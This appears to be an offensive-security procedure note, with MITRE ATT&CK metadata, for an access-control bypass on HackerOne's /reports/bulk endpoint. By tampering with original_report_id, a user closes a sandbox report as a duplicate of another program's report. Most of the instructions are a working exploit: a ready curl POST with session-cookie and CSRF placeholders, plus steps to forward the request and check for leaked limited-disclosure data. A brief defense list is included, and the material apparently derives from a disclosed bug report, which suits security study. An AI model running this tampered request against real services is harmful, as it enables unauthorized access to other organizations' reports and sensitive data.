---
tags:
  - access-bypass
  - parameter-tampering
  - hackerone
  - exploit
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/hackerone-bulk-report-close]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2024-01-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:30:46.971Z'
skill_level: intermediate
impact_level: high
sub_techniques: []
id: ee9ce96a-74a6-4027-b3e0-e868de5c3d94
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Modify-and-Execute-Cross-Program-Duplicate-Closure

## Summary

This procedure modifies the captured bulk closure request to reference an unauthorized report from another program and executes it, exploiting broken access controls to close the target report as a duplicate.

## Description

The core vulnerability lies in the /reports/bulk endpoint's ACL check, which validates view access to the original_report but fails to enforce program/organization boundaries. By changing original_report_id to a public report ID (e.g., from HackerOne's program), User B can close sandbox reports unauthorizedly. This may expose sensitive data like attachments (S3-hosted) or PII from limited-disclosure reports and disrupt workflows.

## Requirements

1. Intercepted legitimate closure request from prior procedure
2. Known public report ID from target external program (e.g., ███████)
3. Proxy or curl for request forwarding
4. User B's session cookies and CSRF token

## Defense

Defensive measures and detection strategies:

- Implement organization-scoped ACL checks on original_report_id
- Validate program ownership in bulk actions
- Monitor for cross-program reference anomalies in audit logs
- Use WAF rules to detect parameter tampering in POST bodies

## Objectives

1. Bypass authorization to link reports across programs
2. Achieve unauthorized closure and potential data exposure
3. Disrupt reporting by misleading duplicate associations

## Instructions

### Step 1: Tamper with Parameters

**Context**: Alter original_report_id to an external ID while preserving session integrity.

In the proxy, edit the POST body: set original_report_id=███████ (external ID), ensure report_ids[]=sandbox_report_id, retain User B's X-Csrf-Token and Cookie headers.

Execute [[commands/hackerone-bulk-report-close]] equivalent via proxy forward or curl.

```bash
curl -X POST 'https://hackerone.com/reports/bulk' \
  -H 'Cookie: <USER B Cookies>' \
  -H 'X-Csrf-Token: <USER B CSRF TOKEN>' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-raw 'message=s&substate=duplicate&original_report_id=███████&report_ids%5B%5D=<sandbox_report_id>&reports_count=1'
```

> Expected output: Request modified; ready to send.

### Step 2: Forward and Execute

**Context**: Submit the tampered request to trigger the bypass.

Forward the request through the proxy or use the curl command above.

> Expected output: Server responds with 200 OK; no auth error.

### Step 3: Validate Exploitation

**Context**: Confirm impact on the report and potential exposure.

Refresh the sandbox dashboard; check if the report is closed as duplicate of the external ID. If the external report was limited-disclosure, attempt to view linked details for exposure.

> Expected output: Report status 'Closed - Duplicate'; cross-link visible, possible sensitive info leak.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/hackerone-bulk-report-close]]

## Tools Used


## Tags

- access-bypass
- parameter-tampering
- exploit
